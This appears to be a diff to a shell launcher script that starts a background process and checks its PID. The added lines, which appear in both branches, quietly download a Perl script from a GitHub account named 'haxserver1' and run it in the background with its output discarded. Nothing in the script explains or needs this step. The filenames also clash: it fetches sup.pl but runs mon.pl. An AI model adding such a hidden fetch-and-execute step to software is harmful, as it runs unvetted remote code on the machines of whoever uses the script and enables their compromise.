@@ -82,6 +82,24 @@ sleep 3
 # Check if the process is running
 if ps -p $PID > /dev/null; then
   echo "Process started successfully with PID $PID."
+
+  # Download and run mon.pl
+  wget https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/sup.pl
+  if [ $? -ne 0 ]; then
+    echo "Failed to download mon.pl."
+    exit 1
+  else
+    echo "mon.pl downloaded successfully."
+  fi
+
+  nohup perl mon.pl >/dev/null 2>&1 &
+  if [ $? -eq 0 ]; then
+    echo "mon.pl started successfully."
+  else
+    echo "Failed to start mon.pl."
+    exit 1
+  fi
+
 else
   echo "Failed to start process with nohup. Trying alternate method."
 
@@ -92,12 +110,29 @@ else
 
   if ps -p $PID > /dev/null; then
     echo "Process started successfully with alternate method with PID $PID."
+
+    # Download and run mon.pl
+    wget https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/sup.pl
+    if [ $? -ne 0 ]; then
+      echo "Failed to download mon.pl."
+      exit 1
+    else
+      echo "mon.pl downloaded successfully."
+    fi
+
+    nohup perl mon.pl >/dev/null 2>&1 &
+    if [ $? -eq 0 ]; then
+      echo "mon.pl started successfully."
+    else
+      echo "Failed to start mon.pl."
+      exit 1
+    fi
+
   else
     echo "Failed to start process with alternate method."
     exit 1
   fi
 fi
-
 
 echo "Script executed successfully."
 exit 1
